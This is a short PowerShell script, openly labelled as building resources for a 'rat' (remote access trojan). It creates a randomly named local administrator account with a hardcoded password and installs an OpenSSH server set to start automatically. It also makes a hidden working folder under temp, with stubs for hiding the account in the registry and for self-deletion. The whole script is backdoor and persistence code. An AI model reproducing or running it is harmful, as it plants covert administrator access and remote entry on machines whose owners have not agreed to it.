# builds resources for rat
# made by : Code0

# random String for directories
function random_text {
    return -join((65..90)+(97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin" 
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
    }
    end{
    }
}

#create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
create_account -uname $uname -pword $pword

#registry to hide local admin


## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#

#goto temp, make working directory
mkdir $path
cd $path

# self delete
# cd $initial_dir
# del installer.ps1

